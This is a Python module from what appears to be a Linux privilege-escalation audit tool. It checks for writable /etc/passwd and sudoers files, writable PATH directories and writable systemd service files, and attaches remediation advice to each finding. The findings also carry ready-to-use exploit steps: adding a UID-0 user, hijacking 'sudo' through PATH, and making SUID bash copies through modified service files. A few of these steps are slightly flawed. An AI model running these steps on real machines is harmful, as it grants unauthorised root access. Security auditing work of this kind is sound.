"""
Permission check module.
Identifies writable files and directories that can lead to privilege escalation.
"""

import os
import stat
from typing import List, Set
from checks.base_check import BaseCheck, Finding, Severity
from utils.helpers import SystemHelpers


class PermissionsCheck(BaseCheck):
    """Check for writable sensitive files and directories."""
    
    SENSITIVE_FILES = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/sudoers',
        '/etc/group',
        '/etc/gshadow',
        '/etc/crontab'
    ]
    
    def __init__(self):
        super().__init__()
        self.seen_findings: Set[str] = set()
    
    def _add_unique_finding(self, finding: Finding) -> bool:
        """Add finding only if not seen before."""
        finding_id = f"{finding.title}_{finding.metadata.get('real_path', finding.metadata.get('path', ''))}"
        if finding_id not in self.seen_findings:
            self.seen_findings.add(finding_id)
            self.findings.append(finding)
            return True
        return False
    
    def run(self, *args, **kwargs) -> List[Finding]:
        """Check for writable sensitive files and directories."""
        current_user = SystemHelpers.get_current_user()
        current_uid = SystemHelpers.get_current_uid()
        
        # Check sensitive files
        for file_path in self.SENSITIVE_FILES:
            if os.path.exists(file_path):
                # Use the correct function that resolves real path
                is_writable, reason = SystemHelpers.is_writable_by_user(file_path)
                if is_writable:
                    real_path = SystemHelpers.get_real_path(file_path)
                    self._add_unique_finding(Finding(
                        title=f"Writable Sensitive File: {os.path.basename(file_path)}",
                        description=f"File {file_path} (real: {real_path}) is writable by current user. This can be used for privilege escalation.",
                        severity=Severity.CRITICAL,
                        exploit_suggestion=f"Add a new root user:\necho 'newroot:$1$abc$...:0:0:root:/root:/bin/bash' >> {file_path}",
                        remediation=f"Fix permissions: chmod 644 {real_path}\nchown root:root {real_path}",
                        metadata={
                            'path': file_path,
                            'real_path': real_path,
                            'reason': reason,
                            'reliability': 'high'
                        }
                    ))
        
        # Check for writable directories in PATH
        path_dirs = os.environ.get('PATH', '').split(':')
        for dir_path in path_dirs:
            if dir_path and os.path.exists(dir_path) and os.path.isdir(dir_path):
                # Skip system directories
                if dir_path in ['/usr/bin', '/bin', '/usr/sbin', '/sbin']:
                    continue
                
                # Use the correct function that resolves real path
                is_writable, reason = SystemHelpers.is_writable_by_user(dir_path)
                if is_writable:
                    real_path = SystemHelpers.get_real_path(dir_path)
                    self._add_unique_finding(Finding(
                        title=f"Writable Directory in PATH: {dir_path}",
                        description=f"Directory {dir_path} (real: {real_path}) is writable and in PATH. You can create malicious binaries that will be executed.",
                        severity=Severity.HIGH,
                        exploit_suggestion=f"""Step-by-step PATH hijack:
1. Create malicious binary:
   echo '#!/bin/bash
   chmod +s /bin/bash 2>/dev/null
   /bin/bash -p' > {dir_path}/sudo

2. Make it executable:
   chmod +x {dir_path}/sudo

3. When 'sudo' is called, your malicious version runs instead

Note: This works if {dir_path} appears BEFORE system directories in PATH""",
                        remediation=f"Remove write permissions: chmod 755 {real_path}",
                        metadata={
                            'path': dir_path,
                            'real_path': real_path,
                            'reason': reason,
                            'reliability': 'high'
                        }
                    ))
        
        # Check for writable service files - COMPLETELY FIXED with real path resolution
        service_dirs = [
            ('system', '/etc/systemd/system/'),
            ('system', '/usr/lib/systemd/system/'),
            ('system', '/lib/systemd/system/'),
            ('user', os.path.expanduser('~/.config/systemd/user/'))
        ]
        
        for service_type, service_dir in service_dirs:
            if not os.path.exists(service_dir):
                continue
                
            try:
                for service_file in os.listdir(service_dir):
                    if not service_file.endswith('.service'):
                        continue
                        
                    symlink_path = os.path.join(service_dir, service_file)
                    
                    # Step 1: Check if this is a valid service file (not symlink to /dev/null)
                    is_valid, valid_reason = SystemHelpers.is_valid_service_file(symlink_path)
                    if not is_valid:
                        continue
                    
                    # Step 2: Get the REAL path after resolving symlinks
                    real_path = SystemHelpers.get_real_path(symlink_path)
                    
                    # Step 3: Check if the REAL file is writable by user
                    is_writable, reason = SystemHelpers.is_writable_by_user(real_path)
                    
                    # Step 4: Skip if not writable
                    if not is_writable:
                        continue
                    
                    # Step 5: Additional verification - double-check the real file
                    if not os.path.exists(real_path):
                        continue
                    
                    # If we get here, the REAL service file is actually writable
                    owner = SystemHelpers.get_file_owner(real_path)
                    perms = SystemHelpers.get_file_permissions(real_path)
                    can_restart, restart_reason = SystemHelpers.can_restart_service(service_file, service_type == 'system')
                    
                    # Determine reliability based on service type and restart capability
                    if service_type == 'system':
                        if can_restart:
                            reliability = 'medium'
                            reliability_pct = 70
                            exploit_suggestion = f"""⚠️ SYSTEM SERVICE WRITABLE - HIGH VALUE FINDING

Service: {symlink_path} -> {real_path}
Owner: {owner}
Permissions: {perms or 'unknown'}

This system service file is writable by your user. This is a serious misconfiguration.

To exploit:
1. Modify the service file:
   sudo sed -i '/[Service]/a ExecStart=/bin/bash -c "chmod +s /bin/bash"' {real_path}

2. Restart the service:
   sudo systemctl restart {service_file.replace('.service', '')}

3. Verify the SUID binary:
   ls -la /bin/bash

WARNING: This requires sudo to restart the service."""
                        else:
                            reliability = 'low'
                            reliability_pct = 40
                            exploit_suggestion = f"""⚠️ SYSTEM SERVICE WRITABLE (Requires Reboot)

Service: {symlink_path} -> {real_path}
Owner: {owner}
Permissions: {perms or 'unknown'}

This system service file is writable but you cannot restart it directly.

To exploit:
1. Modify the service file:
   echo '[Service]
   ExecStart=/bin/bash -c "chmod +s /bin/bash"' >> {real_path}

2. Wait for system reboot OR service restart (unreliable)

Reliability: LOW - depends on system restart"""
                    else:
                        # User service
                        reliability = 'medium'
                        reliability_pct = 70
                        exploit_suggestion = f"""USER SERVICE WRITABLE

Service: {symlink_path} -> {real_path}
Owner: {owner}
Permissions: {perms or 'unknown'}

To exploit:
1. Modify the service file:
   echo '[Service]
   ExecStart=/bin/bash -c "cp /bin/bash /tmp/shell && chmod +s /tmp/shell"' >> {real_path}

2. Restart user service:
   systemctl --user daemon-reload
   systemctl --user restart {service_file.replace('.service', '')}

3. Execute the resulting SUID binary:
   /tmp/shell -p"""
                    
                    severity = Severity.CRITICAL if service_type == 'system' else Severity.HIGH
                    
                    self._add_unique_finding(Finding(
                        title=f"Writable Service File: {service_file}",
                        description=f"Service file {symlink_path} points to {real_path} which is writable by current user. Permissions: {perms or 'unknown'}",
                        severity=severity,
                        exploit_suggestion=exploit_suggestion,
                        remediation=f"Fix permissions: sudo chmod 644 {real_path} && sudo chown root:root {real_path}",
                        metadata={
                            'path': symlink_path,
                            'real_path': real_path,
                            'service_type': service_type,
                            'owner': owner,
                            'permissions': perms,
                            'reason': reason,
                            'reliability': reliability,
                            'reliability_pct': reliability_pct,
                            'can_restart': can_restart
                        }
                    ))
                                
            except PermissionError:
                continue
        
        return self.findings